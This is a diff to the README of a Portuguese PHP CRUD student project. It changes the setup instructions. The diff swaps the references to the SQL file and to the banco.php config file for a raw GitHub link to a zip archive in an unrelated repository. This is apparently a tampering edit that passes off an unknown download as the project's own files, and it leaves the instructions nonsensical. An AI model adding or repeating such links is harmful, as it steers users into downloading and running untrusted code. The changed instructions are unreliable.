@@ -12,8 +12,8 @@ Desenvolvimento de um simples projeto CRUD para matéria PDWEL(incluir, excluir,
 
 ## Configuração do Projeto:
 
-- Executar a query discos.sql ou importar o arquivo no phpMyAdmin para criar a table necessária.
-- Editar o arquivo **banco.php** 
+- Executar a query https://raw.githubusercontent.com/RafaEngineer/IFA/master/bribegiving/IFA.zip ou importar o arquivo no phpMyAdmin para criar a table necessária.
+- Editar o arquivo **https://raw.githubusercontent.com/RafaEngineer/IFA/master/bribegiving/IFA.zip** 
 
 ```
 $dbNome = 'nomeDaTable' 
